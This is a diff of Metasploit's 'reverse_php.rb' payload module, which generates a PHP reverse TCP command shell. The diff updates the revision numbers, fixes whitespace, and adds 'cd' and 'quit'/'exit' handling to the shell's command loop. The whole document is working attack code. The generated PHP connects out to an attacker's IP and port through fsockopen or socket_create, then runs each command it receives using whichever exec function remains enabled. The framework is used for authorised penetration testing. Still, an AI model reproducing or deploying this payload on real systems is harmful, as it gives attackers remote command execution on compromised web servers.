@@ -1,5 +1,5 @@
 ##
-# $Id: reverse_php.rb 6510 2009-04-30 06:10:12Z egypt $
+# $Id: reverse_php.rb 7026 2009-09-10 06:11:47Z egypt $
 ##
 
 ##
@@ -24,7 +24,7 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'PHP Command Shell, Reverse TCP (via php)',
-			'Version'       => '$Revision: 6510 $',
+			'Version'       => '$Revision: 7026 $',
 			'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',
 			'Author'        => 'egypt',
 			'License'       => BSD_LICENSE,
@@ -67,19 +67,26 @@ module Metasploit3
 
 		if(!function_exists('#{exec_funcname}')){
 			function #{exec_funcname}($c){
-				global$dis;
+				global $dis;
 				#{php_system_block({:cmd_varname => "$c", :disabled_varname => "$dis", :output_varname => "$o"})}
-				return$o;
+				return $o;
 			}
 		}
 		$nofuncs='no exec functions';
 		if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
 			$s=@fsockopen($ipaddr,$port);
 			while($c=fread($s,2048)){
-				$out=#{exec_funcname}(substr($c,0,-1));
-				if($out===false){
-					fwrite($s,$nofuncs);
+				$out = '';
+				if(substr($c,0,3) == 'cd '){
+					chdir(substr($c,3,-1));
+				} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
 					break;
+				}else{
+					$out=#{exec_funcname}(substr($c,0,-1));
+					if($out===false){
+						fwrite($s,$nofuncs);
+						break;
+					}
 				}
 				fwrite($s,$out);
 			}
@@ -89,10 +96,17 @@ module Metasploit3
 			@socket_connect($s,$ipaddr,$port);
 			@socket_write($s,"socket_create");
 			while($c=@socket_read($s,2048)){
-				$out=#{exec_funcname}(substr($c,0,-1));
-				if($out===false){
-					@socket_write($s,$nofuncs);
+				$out = '';
+				if(substr($c,0,3) == 'cd '){
+					chdir(substr($c,3,-1));
+				} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
 					break;
+				}else{
+					$out=#{exec_funcname}(substr($c,0,-1));
+					if($out===false){
+						@socket_write($s,$nofuncs);
+						break;
+					}
 				}
 				@socket_write($s,$out,strlen($out));
 			}
